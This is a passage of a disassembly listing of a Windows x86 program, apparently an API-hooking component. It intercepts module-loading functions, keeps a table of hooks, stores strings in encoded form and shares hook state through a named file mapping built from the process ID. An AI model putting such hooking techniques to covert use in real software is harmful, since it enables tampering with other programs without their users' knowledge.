		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4105F3

loc_4105E2:				; CODE XREF: sub_4102F8+2F9j
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile
		retn
; ---------------------------------------------------------------------------

loc_4105EC:				; DATA XREF: sub_4102F8+16Do
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4105E2
; ---------------------------------------------------------------------------

loc_4105F3:				; CODE XREF: sub_4102F8+164j
					; sub_4102F8+2F3j
					; DATA XREF: ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_410611

loc_410600:				; CODE XREF: sub_4102F8+317j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_41060A:				; DATA XREF: sub_4102F8+13Eo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410600
; ---------------------------------------------------------------------------

loc_410611:				; CODE XREF: sub_4102F8+135j
					; sub_4102F8+311j
					; DATA XREF: ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41062F

loc_41061E:				; CODE XREF: sub_4102F8+335j
		mov	eax, [ebp+hMutex]
		push	eax		; hMutex
		call	ReleaseMutex
		retn
; ---------------------------------------------------------------------------

loc_410628:				; DATA XREF: sub_4102F8+EEo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41061E
; ---------------------------------------------------------------------------

loc_41062F:				; CODE XREF: sub_4102F8+32Fj
					; DATA XREF: sub_4102F8+321o
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41064D

loc_41063C:				; CODE XREF: sub_4102F8+353j
		mov	eax, [ebp+hMutex]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_410646:				; DATA XREF: sub_4102F8+D5o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41063C
; ---------------------------------------------------------------------------

loc_41064D:				; CODE XREF: sub_4102F8+CCj
					; sub_4102F8+34Dj
					; DATA XREF: ...
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax+28h], 0
		jz	short loc_4106A9
		xor	ebx, ebx

loc_410658:				; CODE XREF: sub_4102F8+3A1j
		mov	dl, 1
		xor	eax, eax

loc_41065C:				; CODE XREF: sub_4102F8+382j
		mov	ecx, eax
		shl	ecx, 3
		sub	ecx, eax
		mov	esi, [ebp+var_4]
		mov	esi, [esi+28h]
		cmp	dword ptr [esi+ecx*2+1], 0
		jz	short loc_410674
		xor	edx, edx
		jmp	short loc_41067C
; ---------------------------------------------------------------------------

loc_410674:				; CODE XREF: sub_4102F8+376j
		inc	eax
		cmp	eax, 118h
		jnz	short loc_41065C

loc_41067C:				; CODE XREF: sub_4102F8+37Aj
		test	dl, dl
		jnz	short loc_41069B
		mov	bl, 1
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+2Dh], 0
		jnz	loc_410773
		push	1F4h		; dwMilliseconds
		call	Sleep
		jmp	short loc_410658
; ---------------------------------------------------------------------------

loc_41069B:				; CODE XREF: sub_4102F8+386j
		test	bl, bl
		jz	short loc_4106A9
		push	1F4h		; dwMilliseconds
		call	Sleep

loc_4106A9:				; CODE XREF: sub_4102F8+35Cj
					; sub_4102F8+3A5j
		cmp	[ebp+hMem], 0
		jz	short loc_4106F0
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_4106D5
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	eax, [ebp+hMem]
		push	eax		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jnz	short loc_4106D5
		cmp	[ebp+Buffer.Protect], 40h
		jz	short loc_4106E0

loc_4106D5:				; CODE XREF: sub_4102F8+3C1j
					; sub_4102F8+3D5j
		mov	eax, [ebp+hMem]
		push	eax		; hMem
		call	LocalFree_1
		jmp	short loc_4106F0
; ---------------------------------------------------------------------------

loc_4106E0:				; CODE XREF: sub_4102F8+3DBj
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebp+hMem]
		push	eax		; lpAddress
		call	VirtualFree_0

loc_4106F0:				; CODE XREF: sub_4102F8+3B5j
					; sub_4102F8+3E6j
		cmp	[ebp+lpAddress], 0
		jz	short loc_41071C
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_41070C
		push	0
		mov	eax, [ebp+lpAddress]
		push	eax
		call	sub_40A890
		jmp	short loc_41071C
; ---------------------------------------------------------------------------

loc_41070C:				; CODE XREF: sub_4102F8+405j
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebp+lpAddress]
		push	eax		; lpAddress
		call	VirtualFree_0

loc_41071C:				; CODE XREF: sub_4102F8+3FCj
					; sub_4102F8+412j
		mov	eax, [ebp+var_4]
		mov	eax, [eax+1Ch]
		test	eax, eax
		jz	short loc_410736
		push	0
		push	eax
		call	sub_40A890
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax+1Ch], edx

loc_410736:				; CODE XREF: sub_4102F8+42Cj
		mov	eax, [ebp+var_4]
		mov	eax, [eax+18h]
		test	eax, eax
		jz	short loc_410750
		push	0
		push	eax
		call	sub_40A890
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax+18h], edx

loc_410750:				; CODE XREF: sub_4102F8+40j
					; sub_4102F8+446j
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebp+var_4]
		mov	eax, [eax+20h]
		push	eax		; lpAddress
		call	VirtualFree_0
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax+28h], edx
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax+20h], edx

loc_410773:				; CODE XREF: sub_4102F8+391j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41079D

loc_410780:				; CODE XREF: sub_4102F8+4A3j
		lea	eax, [ebp+var_50]
		mov	edx, 4
		call	sub_4039B8
		lea	eax, [ebp+var_18]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_410796:				; DATA XREF: sub_4102F8+27o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410780
; ---------------------------------------------------------------------------

loc_41079D:				; CODE XREF: sub_4102F8+49Dj
					; DATA XREF: sub_4102F8+483o
		cmp	[ebp+var_5], 0
		jle	short loc_4107AB
		mov	eax, [ebp+var_4]
		call	sub_402E90

loc_4107AB:				; CODE XREF: sub_4102F8+4A9j
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4102F8	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 3
dword_4107BC	dd 1D1438h, 0FFFFFFFFh,	5 ; DATA XREF: sub_4102F8+88o
dword_4107C8	dd 30212018h, 2Dh, 0FFFFFFFFh, 2 ; DATA	XREF: sub_4102F8+95o
dword_4107D8	dd 202Ch, 0FFFFFFFFh, 0Bh ; DATA XREF: sub_4102F8+A2o
					; sub_4102F8+10Bo
dword_4107E4	dd 3038341Bh, 33201731h, 273033h ; DATA	XREF: sub_4102F8+FEo
off_4107F0	dd offset dword_4107F4	; DATA XREF: CODE:0041082Do
					; CODE:00410835o ...
dword_4107F4	dd 4854090Eh, 496B6F6Fh, 286D6574h, 3000000h ; DATA XREF: CODE:off_4107F0o
		db 3 dup(0)
		dd offset off_401018
		db 8
		db 3 dup(0)
		dd offset off_401018
		db 0Ch
		db 3 dup(0)
		dd offset off_401018
		db 10h
		align 10h
off_410820	dd offset dword_410824	; DATA XREF: sub_410970+172r
					; sub_411004+AAr ...
dword_410824	dd 392E0311h, 2834h	; DATA XREF: CODE:off_410820o
		db 0
		dd offset off_4107F0
		db 3 dup(0FFh)
		db 0FFh
		dd offset off_4107F0
		db 0Bh,	6Dh, 61h
		dd 646F4364h, 6F6F4865h, 408D6Bh

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_410848(LPCSTR lpModuleName)
sub_410848	proc near		; DATA XREF: sub_410970+2BEo

lpModuleName	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		push	ebp
		push	offset loc_410871
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+lpModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleA_0_0
		mov	ebx, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_41087D
; ---------------------------------------------------------------------------

loc_410871:				; DATA XREF: sub_410848+9o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		xor	ebx, ebx
		call	sub_4033E8

loc_41087D:				; CODE XREF: sub_410848+27j
		mov	eax, [ebp+lpModuleName]
		push	eax
		call	ds:dword_416B0C
		mov	esi, eax
		cmp	ebx, esi
		jz	short loc_410894
		mov	eax, esi
		call	sub_4111D4

loc_410894:				; CODE XREF: sub_410848+43j
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	4
sub_410848	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_4108A0(LPCSTR lpModuleName,	int, int)
sub_4108A0	proc near		; DATA XREF: sub_410970+2E7o

lpModuleName	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		push	ebp
		push	offset loc_4108C9
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+lpModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleA_0_0
		mov	esi, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_4108D5
; ---------------------------------------------------------------------------

loc_4108C9:				; DATA XREF: sub_4108A0+9o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		xor	esi, esi
		call	sub_4033E8

loc_4108D5:				; CODE XREF: sub_4108A0+27j
		mov	eax, [ebp+arg_8]
		push	eax
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+lpModuleName]
		push	eax
		call	ds:dword_416B10
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_4108FE
		cmp	esi, ebx
		jz	short loc_4108FE
		test	byte ptr [ebp+arg_8], 2
		jnz	short loc_4108FE
		mov	eax, ebx
		call	sub_4111D4

loc_4108FE:				; CODE XREF: sub_4108A0+4Bj
					; sub_4108A0+4Fj ...
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	0Ch
sub_4108A0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_410908(LPCWSTR lpModuleName, int, int)
sub_410908	proc near		; DATA XREF: sub_410970+312o

lpModuleName	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		push	ebp
		push	offset loc_410931
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+lpModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleW
		mov	esi, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_41093D
; ---------------------------------------------------------------------------

loc_410931:				; DATA XREF: sub_410908+9o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		xor	esi, esi
		call	sub_4033E8

loc_41093D:				; CODE XREF: sub_410908+27j
		mov	eax, [ebp+arg_8]
		push	eax
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+lpModuleName]
		push	eax
		call	ds:dword_416B14
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_410966
		cmp	esi, ebx
		jz	short loc_410966
		test	byte ptr [ebp+arg_8], 2
		jnz	short loc_410966
		mov	eax, ebx
		call	sub_4111D4

loc_410966:				; CODE XREF: sub_410908+4Bj
					; sub_410908+4Fj ...
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	0Ch
sub_410908	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_410970	proc near		; CODE XREF: sub_40CD78+1A5p
					; sub_40CD78+1F8p ...

var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_15		= byte ptr -15h
dwErrCode	= dword	ptr -14h
var_D		= byte ptr -0Dh
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFD4h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_2C], ebx
		mov	[ebp+var_24], ebx
		mov	[ebp+var_28], ebx
		mov	[ebp+var_20], ebx
		mov	[ebp+var_1C], ebx
		mov	[ebp+var_C], ecx
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_C]
		call	sub_403E14
		mov	eax, [ebp+arg_10]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_410DBB
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+var_D], 0
		call	sub_40BD58
		push	0		; dwErrCode
		call	SetLastError
		cmp	[ebp+arg_C], 0
		jz	loc_410A76
		xor	eax, eax
		push	ebp
		push	offset loc_410A68
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	[ebp+var_8], 0
		jnz	short loc_410A14
		lea	ecx, [ebp+var_1C]
		lea	edx, [ebp+dwErrCode]
		mov	eax, [ebp+arg_C]
		call	sub_4066FC
		mov	eax, [ebp+arg_10]
		push	eax
		mov	eax, [ebp+arg_C]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		mov	ecx, [ebp+dwErrCode]
		mov	dl, 1
		mov	eax, off_40E898
		call	sub_40F0A4
		mov	ebx, eax
		jmp	short loc_410A39
; ---------------------------------------------------------------------------

loc_410A14:				; CODE XREF: sub_410970+6Dj
		mov	eax, [ebp+arg_10]
		push	eax
		mov	eax, [ebp+arg_C]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		mov	ecx, [ebp+var_8]
		mov	dl, 1
		mov	eax, off_40E898
		call	sub_40F0A4
		mov	ebx, eax

loc_410A39:				; CODE XREF: sub_410970+A2j
		cmp	byte ptr [ebx+4], 0
		jnz	short loc_410A5E
		call	GetLastError
		mov	[ebp+dwErrCode], eax
		mov	eax, ebx
		call	sub_402D18
		mov	eax, [ebp+dwErrCode]
		push	eax		; dwErrCode
		call	SetLastError
		xor	ebx, ebx
		xor	eax, eax
		mov	[ebp+var_8], eax

loc_410A5E:				; CODE XREF: sub_410970+CDj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_410A78
; ---------------------------------------------------------------------------

loc_410A68:				; DATA XREF: sub_410970+5Eo
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		xor	ebx, ebx
		call	sub_4033E8
		jmp	short loc_410A78
; ---------------------------------------------------------------------------

loc_410A76:				; CODE XREF: sub_410970+55j
		xor	ebx, ebx

loc_410A78:				; CODE XREF: sub_410970+F6j
					; sub_410970+104j
		test	ebx, ebx
		jnz	short loc_410A90
		cmp	[ebp+arg_C], 0
		jnz	loc_410D83
		cmp	[ebp+var_C], 0
		jz	loc_410D83

loc_410A90:				; CODE XREF: sub_410970+10Aj
		mov	[ebp+var_D], 1
		cmp	ds:byte_416B08,	0
		jnz	short loc_410AAE
		push	offset stru_4176D8 ; lpCriticalSection
		call	InitializeCriticalSection_0
		mov	ds:byte_416B08,	1

loc_410AAE:				; CODE XREF: sub_410970+12Bj
		push	offset stru_4176D8 ; lpCriticalSection
		call	EnterCriticalSection_0
		xor	eax, eax
		push	ebp
		push	offset loc_410BFF
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, ds:dword_4176F0
		call	sub_40455C
		mov	[ebp+dwErrCode], eax
		mov	eax, [ebp+dwErrCode]
		inc	eax
		push	eax
		mov	eax, offset dword_4176F0
		mov	ecx, 1
		mov	edx, off_410820
		call	sub_404718
		add	esp, 4
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		mov	ecx, [ebp+var_4]
		mov	[edx+eax*8], ecx
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		mov	ecx, [ebp+var_8]
		mov	[edx+eax*8+4], ecx
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		lea	eax, [edx+eax*8+8]
		mov	edx, [ebp+var_C]
		call	sub_4039E8
		lea	ecx, [ebp+var_20]
		mov	dl, 1
		mov	eax, [ebp+var_C]
		call	sub_40653C
		mov	edx, [ebp+var_20]
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	ecx, ds:dword_4176F0
		lea	eax, [ecx+eax*8+0Ch]
		call	sub_4039E8
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		lea	eax, [edx+eax*8+10h]
		mov	edx, [ebp+arg_10]
		call	sub_4039E8
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		mov	ecx, [ebp+arg_C]
		mov	[edx+eax*8+14h], ecx
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		mov	[edx+eax*8+18h], ebx
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		mov	ecx, [ebp+arg_4]
		mov	[edx+eax*8+1Ch], ecx
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		mov	ecx, [ebp+arg_8]
		mov	[edx+eax*8+20h], ecx
		mov	eax, [ebp+dwErrCode]
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176F0
		mov	ecx, [ebp+arg_0]
		mov	[edx+eax*8+24h], ecx
		cmp	[ebp+var_4], 0
		jz	short loc_410BDE
		cmp	ds:dword_416B0C, 0
		jnz	short loc_410BDE
		cmp	ds:dword_416B14, 0
		jz	short loc_410BE2

loc_410BDE:				; CODE XREF: sub_410970+25Aj
					; sub_410970+263j
		xor	eax, eax
		jmp	short loc_410BE4
; ---------------------------------------------------------------------------

loc_410BE2:				; CODE XREF: sub_410970+26Cj
		mov	al, 1

loc_410BE4:				; CODE XREF: sub_410970+270j
		mov	[ebp+var_15], al
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_410C06

loc_410BF4:				; CODE XREF: sub_410970+294j
		push	offset stru_4176D8 ; lpCriticalSection
		call	LeaveCriticalSection_0
		retn
; ---------------------------------------------------------------------------

loc_410BFF:				; DATA XREF: sub_410970+14Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410BF4
; ---------------------------------------------------------------------------

loc_410C06:				; CODE XREF: sub_410970+28Ej
					; DATA XREF: sub_410970+27Fo
		cmp	[ebp+var_15], 0
		jz	loc_410D83
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_410C70
		push	0
		mov	eax, offset dword_410DD8
		call	sub_409880
		call	sub_40CA04
		push	eax
		push	offset sub_410848
		push	offset dword_416B0C
		push	0
		xor	ecx, ecx
		xor	edx, edx
		xor	eax, eax
		call	sub_410970
		push	0
		mov	eax, offset dword_410DF0
		call	sub_409880
		call	sub_40CA04
		push	eax
		push	offset sub_4108A0
		push	offset dword_416B10
		push	0
		xor	ecx, ecx
		xor	edx, edx
		xor	eax, eax
		call	sub_410970
		jmp	short loc_410C99
; ---------------------------------------------------------------------------

loc_410C70:				; CODE XREF: sub_410970+2AAj
		push	0
		mov	eax, offset dword_410E08
		call	sub_409880
		call	sub_40CA04
		push	eax
		push	offset sub_410908
		push	offset dword_416B14
		push	0
		xor	ecx, ecx
		xor	edx, edx
		xor	eax, eax
		call	sub_410970

loc_410C99:				; CODE XREF: sub_410970+2FEj
		lea	eax, [ebp+var_24]
		push	eax
		call	GetCurrentProcessId
		mov	cl, 30h
		mov	edx, 8
		call	sub_4061D8
		mov	eax, [ebp+var_24]
		push	eax
		lea	edx, [ebp+var_28]
		mov	eax, offset dword_410E20
		call	sub_4064CC
		mov	edx, [ebp+var_28]
		lea	eax, [ebp+var_1C]
		pop	ecx
		call	sub_403C70
		cmp	ds:byte_4169E8,	0
		jz	short loc_410D1E
		mov	eax, [ebp+var_1C]
		call	sub_403C24
		mov	ebx, eax
		lea	edx, [ebx+4]
		lea	eax, [ebp+var_1C]
		call	sub_403F0C
		lea	eax, [ebp+var_1C]
		call	sub_403E7C
		mov	byte ptr [eax+ebx], 24h
		lea	eax, [ebp+var_1C]
		call	sub_403E7C
		mov	byte ptr [eax+ebx+1], 6Dh
		lea	eax, [ebp+var_1C]
		call	sub_403E7C
		mov	byte ptr [eax+ebx+2], 63h
		lea	eax, [ebp+var_1C]
		call	sub_403E7C
		mov	byte ptr [eax+ebx+3], 68h
		jmp	short loc_410D3E
; ---------------------------------------------------------------------------

loc_410D1E:				; CODE XREF: sub_410970+362j
		lea	eax, [ebp+var_2C]
		push	eax
		mov	cl, 30h
		mov	edx, 8
		mov	eax, ds:hModule
		call	sub_4061D8
		mov	edx, [ebp+var_2C]
		lea	eax, [ebp+var_1C]
		call	sub_403C2C

loc_410D3E:				; CODE XREF: sub_410970+3ACj
		push	4		; dwMaximumSizeLow
		mov	eax, [ebp+var_1C]
		call	sub_403E24
		push	eax		; int
		call	sub_40C3F4
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_410D83
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		push	ebx		; hFileMappingObject
		call	MapViewOfFile
		test	eax, eax
		jz	short loc_410D7D
		mov	dword ptr [eax], offset	sub_4116B8
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile
		mov	ds:dword_416B18, ebx
		jmp	short loc_410D83
; ---------------------------------------------------------------------------

loc_410D7D:				; CODE XREF: sub_410970+3F7j
		push	ebx		; hObject
		call	CloseHandle

loc_410D83:				; CODE XREF: sub_410970+110j
					; sub_410970+11Aj ...
		cmp	[ebp+var_D], 0
		jz	short loc_410D90
		push	0		; dwErrCode
		call	SetLastError

loc_410D90:				; CODE XREF: sub_410970+417j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_410DC2

loc_410D9D:				; CODE XREF: sub_410970+450j
		lea	eax, [ebp+var_2C]
		mov	edx, 5
		call	sub_4039B8
		lea	eax, [ebp+var_C]
		call	sub_403994
		lea	eax, [ebp+arg_10]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_410DBB:				; DATA XREF: sub_410970+36o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410D9D
; ---------------------------------------------------------------------------

loc_410DC2:				; CODE XREF: sub_410970+44Aj
					; DATA XREF: sub_410970+428o
		mov	al, [ebp+var_D]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	14h
sub_410970	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 0Ch
dword_410DD8	dd 31343A19h, 27373C19h, 142C2734h, 0 ;	DATA XREF: sub_410970+2AEo
		dd 0FFFFFFFFh, 0Eh
dword_410DF0	dd 31343A19h, 27373C19h, 102C2734h, 142Dh, 0FFFFFFFFh
					; DATA XREF: sub_410970+2D7o
		dd 0Eh
dword_410E08	dd 31343A19h, 27373C19h, 102C2734h, 22Dh, 0FFFFFFFFh, 0Dh
					; DATA XREF: sub_410970+302o
dword_410E20	dd 3A212014h, 3A3D3B00h, 34183E3Ah, 25h	; DATA XREF: sub_410970+345o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_410E30	proc near		; CODE XREF: CODE:00415C4Fp
					; CODE:00415C6Ap ...

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
lpModuleName	= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		mov	ebx, [ebp+arg_0]
		xor	eax, eax
		push	ebp
		push	offset loc_410F32
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	esi, esi
		test	ebx, ebx
		jz	loc_410F10
		test	edi, edi
		jz	loc_410F10
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_410E94
		lea	eax, [ebp+var_C]
		mov	edx, ebx
		call	sub_403B8C
		mov	eax, [ebp+var_C]
		lea	ecx, [ebp+lpModuleName]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+lpModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleW
		mov	esi, eax
		jmp	short loc_410E9C
; ---------------------------------------------------------------------------

loc_410E94:				; CODE XREF: sub_410E30+3Ej
		push	ebx		; lpModuleName
		call	GetModuleHandleA_0_0
		mov	esi, eax

loc_410E9C:				; CODE XREF: sub_410E30+62j
		test	esi, esi
		jz	short loc_410ECA
		lea	eax, [ebp+var_10]
		mov	edx, edi
		call	sub_403B8C
		mov	edx, [ebp+var_10]
		mov	eax, esi
		call	sub_406960
		mov	[ebp+var_4], eax
		cmp	[ebp+var_4], 0
		jz	short loc_410ECF
		mov	eax, [ebp+var_4]
		call	sub_40CA04
		mov	[ebp+var_4], eax
		jmp	short loc_410ECF
; ---------------------------------------------------------------------------

loc_410ECA:				; CODE XREF: sub_410E30+6Ej
		xor	eax, eax
		mov	[ebp+var_4], eax

loc_410ECF:				; CODE XREF: sub_410E30+8Bj
					; sub_410E30+98j
		lea	eax, [ebp+var_14]
		mov	edx, edi
		call	sub_403B8C
		mov	eax, [ebp+var_14]
		push	eax
		mov	eax, [ebp+var_4]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		mov	eax, [ebp+arg_C]
		push	eax
		mov	eax, [ebp+arg_10]
		push	eax
		lea	eax, [ebp+var_18]
		mov	edx, ebx
		call	sub_403B8C
		mov	eax, [ebp+var_18]
		push	eax
		call	sub_4113D8
		mov	edx, esi
		pop	ecx
		call	sub_410970
		neg	al
		sbb	eax, eax
		mov	esi, eax
		jmp	short loc_410F17
; ---------------------------------------------------------------------------

loc_410F10:				; CODE XREF: sub_410E30+26j
					; sub_410E30+2Ej
		push	57h		; dwErrCode
		call	SetLastError

loc_410F17:				; CODE XREF: sub_410E30+DEj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_410F39

loc_410F24:				; CODE XREF: sub_410E30+107j
		lea	eax, [ebp+var_18]
		mov	edx, 5
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_410F32:				; DATA XREF: sub_410E30+17o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410F24
; ---------------------------------------------------------------------------

loc_410F39:				; CODE XREF: sub_410E30+101j
					; DATA XREF: sub_410E30+EFo
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	14h
sub_410E30	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_410F44	proc near		; CODE XREF: sub_4111D4+1A5p

dwErrCode	= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF4h
		push	ebx
		mov	ebx, [ebp+arg_0]
		xor	eax, eax
		mov	[ebp+var_4], eax
		call	GetLastError
		mov	[ebp+dwErrCode], eax
		cmp	ds:byte_416B08,	0
		jz	loc_410FEE
		xor	eax, eax
		mov	[ebp+var_8], eax
		push	offset stru_4176D8 ; lpCriticalSection
		call	EnterCriticalSection_0
		xor	ecx, ecx
		push	ebp
		push	offset loc_410FD9
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		mov	eax, ds:dword_4176F0
		call	sub_404564
		cmp	eax, 0
		jl	short loc_410FC1

loc_410F94:				; CODE XREF: sub_410F44+7Bj
		lea	edx, [eax+eax*4]
		mov	ecx, ds:dword_4176F0
		mov	ecx, [ecx+edx*8+1Ch]
		cmp	ecx, ebx
		jnz	short loc_410FBB
